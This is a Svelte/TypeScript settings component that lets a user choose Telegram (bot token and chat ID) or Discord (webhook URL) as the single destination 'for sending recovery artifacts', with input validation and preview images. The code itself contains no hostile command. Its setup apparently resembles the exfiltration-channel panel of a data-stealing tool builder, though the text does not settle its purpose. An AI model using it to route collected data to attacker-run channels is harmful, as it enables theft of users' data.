<script lang="ts">
  import { Input } from "$lib/components/ui/input";
  import { Label } from "$lib/components/ui/label";
  import { Switch } from "$lib/components/ui/switch";
  import { FolderOpen } from "@lucide/svelte";

  type CommChannel = "telegram" | "discord";

  type Props = {
    commMode?: CommChannel;
    setCommMode?: (mode: CommChannel) => void;
    telegramToken?: string;
    telegramChatId?: string;
    discordWebhook?: string;
    onTelegramTokenChange?: (value: string) => void;
    onTelegramChatIdChange?: (value: string) => void;
    onDiscordWebhookChange?: (value: string) => void;
  };

  const props = $props();

  let {
    commMode = "telegram",
    setCommMode = () => undefined,
    telegramToken = "",
    telegramChatId = "",
    discordWebhook = "",
    onTelegramTokenChange = () => undefined,
    onTelegramChatIdChange = () => undefined,
    onDiscordWebhookChange = () => undefined,
  } = props as Props;

  const previewImages: Record<CommChannel, { src: string; alt: string }> = {
    telegram: {
      src: "/previews/TelegramPreview.png",
      alt: "Telegram preview image",
    },
    discord: {
      src: "/previews/DiscordPreview.png",
      alt: "Discord preview image",
    },
  };

  let hoveredPreview = $state<CommChannel | null>(null);
  let activePreview = $state<CommChannel | null>(null);

  const telegramTokenValid = () =>
    telegramToken.trim().length === 0 ? true : /^\d+:[A-Za-z0-9_-]{20,}$/.test(telegramToken.trim());
  const telegramChatIdValid = () =>
    telegramChatId.trim().length === 0 ? true : /^-?\d+$/.test(telegramChatId.trim());
  const discordWebhookValid = () =>
    discordWebhook.trim().length === 0
      ? true
      : /^https:\/\/(canary\.|ptb\.)?discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9_-]+$/.test(discordWebhook.trim());

  const handlePreviewHover = (mode: CommChannel | null) => {
    hoveredPreview = mode;
  };

  const openPreviewLightbox = (mode: CommChannel) => {
    hoveredPreview = null;
    activePreview = mode;
  };

  const closePreviewLightbox = () => {
    activePreview = null;
  };
</script>

<div class="space-y-4">
  <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
    <FolderOpen class="h-4 w-4 text-primary" />
    Communication
  </div>
  <p class="text-xs text-muted-foreground">
    Choose exactly one destination for sending recovery artifacts.
  </p>
  <div class="grid gap-4 md:grid-cols-2">
    <div
      class={`space-y-3 rounded-md border border-border/70 bg-muted/20 p-4 transition ${commMode === "telegram" ? "border-primary/70 bg-primary/5" : ""} ${commMode !== "telegram" ? "cursor-pointer opacity-70" : ""
        }`}
      role="button"
      tabindex="0"
      onclick={() => setCommMode("telegram")}
      onkeydown={(event) => {
        if (event.key === "Enter" || event.key === " ") {
          event.preventDefault();
          setCommMode("telegram");
        }
      }}
    >
      <div class="flex items-center justify-between gap-3">
        <div>
          <p class="text-sm font-semibold">Telegram</p>
          <p class="text-xs text-muted-foreground">Token + chat ID</p>
        </div>
        <Switch
          checked={commMode === "telegram"}
          onclick={(event) => event.stopPropagation()}
          onCheckedChange={(checked) => {
            if (checked) {
              setCommMode("telegram");
            } else {
              setCommMode("discord");
            }
          }}
        />
      </div>
      <div class="space-y-2">
        <Label class="text-xs text-muted-foreground" for="telegram-token">
          Telegram Token
        </Label>
        <Input
          id="telegram-token"
          placeholder="123456789:ABC..."
          value={telegramToken}
          oninput={(event) => onTelegramTokenChange((event.target as HTMLInputElement).value)}
          disabled={commMode !== "telegram"}
          class={`${commMode !== "telegram" ? "pointer-events-none" : ""} ${!telegramTokenValid() && commMode === "telegram" ? "border-destructive focus-visible:ring-destructive/30"
            : ""
            }`}
        />
        {#if commMode === "telegram"}
          <p class="text-xs text-muted-foreground">
            Format: bot token like <span class="font-mono">123456789:ABCDEF...</span>
          </p>
        {/if}
      </div>
      <div class="space-y-2">
        <Label class="text-xs text-muted-foreground" for="telegram-chat-id">
          Telegram Chat ID
        </Label>
        <Input
          id="telegram-chat-id"
          placeholder="123456789"
          value={telegramChatId}
          oninput={(event) => onTelegramChatIdChange((event.target as HTMLInputElement).value)}
          disabled={commMode !== "telegram"}
          class={`${commMode !== "telegram" ? "pointer-events-none" : ""} ${!telegramChatIdValid() && commMode === "telegram" ? "border-destructive focus-visible:ring-destructive/30"
            : ""
            }`}
        />
        {#if commMode === "telegram"}
          <p class="text-xs text-muted-foreground">
            Numeric chat ID (e.g. <span class="font-mono">123456789</span> or{" "}
            <span class="font-mono">-1001234567890</span>).
          </p>
        {/if}
      </div>
      <div class="flex items-center justify-between gap-2 text-xs text-muted-foreground">
        <p class="max-w-[70%] text-[0.7rem]">
          Hover to peek at how Telegram bot notifications appear.
        </p>
        <div
          class="relative inline-flex"
          role="group"
          aria-label="Preview tooltip container"
          onmouseenter={() => handlePreviewHover("telegram")}
          onmouseleave={() => handlePreviewHover(null)}
        >
          <button
            type="button"
            aria-label="Preview Telegram mockup"
            class="text-xs font-semibold uppercase tracking-wide text-primary underline-offset-4 focus-visible:outline focus-visible:outline-offset-2 focus-visible:outline-primary hover:text-primary/80"
            onfocus={() => handlePreviewHover("telegram")}
            onblur={() => handlePreviewHover(null)}
            onclick={(event) => {
              event.stopPropagation();
              openPreviewLightbox("telegram");
            }}
          >
            Preview
          </button>
          {#if hoveredPreview === "telegram"}
            <div
              class="absolute right-0 top-full z-10 mt-2 w-56 max-w-[90vw]"
              role="presentation"
              onmouseenter={() => handlePreviewHover("telegram")}
              onmouseleave={() => handlePreviewHover(null)}
            >
              <img
                src={previewImages.telegram.src}
                alt={previewImages.telegram.alt}
                class="h-32 w-full rounded-md object-cover"
              />
            </div>
          {/if}
        </div>
      </div>
    </div>
    <div
      class={`space-y-3 rounded-md border border-border/70 bg-muted/20 p-4 transition ${commMode === "discord" ? "border-primary/70 bg-primary/5" : ""} ${commMode !== "discord" ? "cursor-pointer opacity-70" : ""
        }`}
      role="button"
      tabindex="0"
      onclick={() => setCommMode("discord")}
      onkeydown={(event) => {
        if (event.key === "Enter" || event.key === " ") {
          event.preventDefault();
          setCommMode("discord");
        }
      }}
    >
      <div class="flex items-center justify-between gap-3">
        <div>
          <p class="text-sm font-semibold">Discord</p>
          <p class="text-xs text-muted-foreground">Webhook URL</p>
        </div>
        <Switch
          checked={commMode === "discord"}
          onclick={(event) => event.stopPropagation()}
          onCheckedChange={(checked) => {
            if (checked) {
              setCommMode("discord");
            } else {
              setCommMode("telegram");
            }
          }}
        />
      </div>
      <div class="space-y-2">
        <Label class="text-xs text-muted-foreground" for="discord-webhook">
          Discord Webhook URL
        </Label>
        <Input
          id="discord-webhook"
          placeholder="https://discord.com/api/webhooks/..."
          value={discordWebhook}
          oninput={(event) => onDiscordWebhookChange((event.target as HTMLInputElement).value)}
          disabled={commMode !== "discord"}
          class={`${commMode !== "discord" ? "pointer-events-none" : ""} ${!discordWebhookValid() && commMode === "discord" ? "border-destructive focus-visible:ring-destructive/30" : ""
            }`}
        />
        {#if commMode === "discord"}
          <p class="text-xs text-muted-foreground">
            Full webhook URL like <span class="font-mono">https://discord.com/api/webhooks/…</span>
          </p>
        {/if}
      </div>
      <div class="flex items-center justify-between gap-2 text-xs text-muted-foreground">
        <p class="max-w-[70%] text-[0.7rem]">
          Hover to preview how Discord webhook alerts are presented.
        </p>
        <div
          class="relative inline-flex"
          role="group"
          aria-label="Preview tooltip container"
          onmouseenter={() => handlePreviewHover("discord")}
          onmouseleave={() => handlePreviewHover(null)}
        >
          <button
            type="button"
            aria-label="Preview Discord mockup"
            class="text-xs font-semibold uppercase tracking-wide text-primary underline-offset-4 focus-visible:outline focus-visible:outline-offset-2 focus-visible:outline-primary hover:text-primary/80"
            onfocus={() => handlePreviewHover("discord")}
            onblur={() => handlePreviewHover(null)}
            onclick={(event) => {
              event.stopPropagation();
              openPreviewLightbox("discord");
            }}
          >
            Preview
          </button>
          {#if hoveredPreview === "discord"}
            <div
              class="absolute right-0 top-full z-10 mt-2 w-56 max-w-[90vw]"
              role="presentation"
              onmouseenter={() => handlePreviewHover("discord")}
              onmouseleave={() => handlePreviewHover(null)}
            >
              <img
                src={previewImages.discord.src}
                alt={previewImages.discord.alt}
                class="h-32 w-full rounded-md object-cover"
              />
            </div>
          {/if}
        </div>
      </div>
    </div>
  </div>
  {#if activePreview}
    <div
      class="fixed inset-0 z-50 grid place-items-center bg-black/70 p-4"
      role="button"
      tabindex="0"
      onkeydown={(event) => {
        if (event.key === "Enter" || event.key === " ") {
          event.preventDefault();
          closePreviewLightbox();
        }
      }}
      onclick={closePreviewLightbox}
    >
      <div
        class="max-w-[90vw] max-h-[90vh]"
        role="dialog"
        aria-modal="true"
        aria-label="Communication preview"
        tabindex="0"
        onclick={(event) => event.stopPropagation()}
        onkeydown={(event) => event.stopPropagation()}
      >
        <img
          src={previewImages[activePreview].src}
          alt={previewImages[activePreview].alt}
          class="max-h-[80vh] w-auto object-contain"
        />
      </div>
    </div>
  {/if}
</div>
